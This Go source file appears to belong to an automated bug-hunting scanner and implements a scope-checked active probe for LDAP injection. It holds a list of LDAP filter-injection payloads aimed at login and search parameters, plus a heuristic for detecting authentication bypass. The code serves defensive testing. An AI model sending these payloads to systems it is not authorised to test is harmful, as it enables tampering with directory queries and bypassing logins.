package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scope"
)

var ldapProbeParams = []string{"username", "user", "uid", "login", "email", "cn", "search", "q", "filter", "name"}
var ldapPayloads = []string{"*)(uid=*))(|(uid=*", "*)(%26", "*)(|(uid=*)", `\\2a)(uid=*`, "admin)(|(cn=*"}
var ldapErrorSignatures = []string{"ldap error", "ldap_bind", "invalid dn syntax", "ldap: invalid", "javax.naming", "ldap://", "00002030", "0x51", "sizelimitexceeded", "ldap_search", "com.sun.jndi.ldap"}

const ldapMaxAttempts = 12

func (s *Service) runActiveLDAPInjectionProbe(ctx context.Context, input RunInput, body string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}
	candidates := extractRuntimeEndpoints(input.Target, body, input.Scope, 10)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	type hit struct {
		url       string
		param     string
		payload   string
		signature string
	}
	var hits []hit
	attempts := 0
	for _, raw := range candidates {
		if attempts >= ldapMaxAttempts {
			break
		}
		base, err := url.Parse(strings.TrimSpace(raw))
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}
		for _, param := range ldapProbeParams {
			if attempts >= ldapMaxAttempts {
				break
			}
			baselineURL := ldapQueryURL(base, param, "guest")
			baselineStatus, baselineLen := 0, 0
			if scope.IsURLInScope(baselineURL, input.Scope) {
				if req, err := http.NewRequestWithContext(ctx, http.MethodGet, baselineURL, nil); err == nil {
					ApplyAuthProfile(req, input.AuthProfile)
					if resp, err := s.doRequestWithRetry(ctx, req, input.Options); err == nil && resp != nil {
						bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
						_ = resp.Body.Close()
						baselineStatus, baselineLen = resp.StatusCode, len(bodyBytes)
					}
				}
			}
			for _, payload := range ldapPayloads {
				if attempts >= ldapMaxAttempts {
					break
				}
				probeURL := ldapQueryURL(base, param, payload)
				if !scope.IsURLInScope(probeURL, input.Scope) {
					continue
				}
				req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(req, input.AuthProfile)
				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				attempts++
				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
				_ = resp.Body.Close()
				if sig := matchAnyLower(string(respBody), ldapErrorSignatures); sig != "" || ldapLooksLikeBypass(baselineStatus, baselineLen, resp.StatusCode, len(respBody), string(respBody)) {
					if sig == "" {
						sig = "authentication bypass heuristic"
					}
					hits = append(hits, hit{url: probeURL, param: param, payload: payload, signature: sig})
					break
				}
			}
			if len(hits) > 0 {
				break
			}
		}
	}
	if len(hits) == 0 {
		return nil
	}
	first := hits[0]
	curl := buildCurlReproducer(http.MethodGet, first.url, input.AuthProfile, "", "")
	return []model.Finding{{
		ID:                "active-ldap-injection",
		Category:          "injection",
		Severity:          model.SeverityHigh,
		Title:             "LDAP injection confirmed via active probe",
		Description:       "Supplying LDAP filter metacharacters caused an LDAP-specific error or authentication-bypass signal in the response. This indicates unescaped user input is flowing into an LDAP query or bind operation.",
		Evidence:          fmt.Sprintf("Probe %s triggered %q on parameter %q", first.url, first.signature, first.param),
		Recommendation:    "Escape LDAP special characters before building filters, use parameterized directory APIs where available, and avoid concatenating user-controlled values into LDAP queries or distinguished names.",
		Confidence:        0.88,
		AffectedURL:       first.url,
		AffectedParameter: first.param,
		CWE:               "CWE-90",
		OWASPCategory:     "A03:2021 - Injection",
		Sources:           []string{"active-scanner"},
		ReproductionSteps: []string{fmt.Sprintf("Send GET %s", first.url), fmt.Sprintf("Observe the LDAP signal %q in the response.", first.signature)},
		PoC:               curl,
		EvidenceFields: map[string]string{
			"validationType": "active-probe",
			"payload":        first.payload,
			"signature":      first.signature,
			"curlReproducer": curl,
		},
		BusinessTags: []string{"authentication", "directory-services"},
	}}
}

func ldapQueryURL(base *url.URL, param, value string) string {
	probe := *base
	q := probe.Query()
	q.Set(param, value)
	probe.RawQuery = q.Encode()
	return probe.String()
}

func ldapLooksLikeBypass(baselineStatus, baselineLen, status, bodyLen int, body string) bool {
	if status != http.StatusOK {
		return false
	}
	if baselineStatus == http.StatusUnauthorized || baselineStatus == http.StatusForbidden {
		return true
	}
	if absInt(bodyLen-baselineLen) > 50 {
		lower := strings.ToLower(body)
		return strings.Contains(lower, "welcome") || strings.Contains(lower, "dashboard") || strings.Contains(lower, "admin")
	}
	return false
}
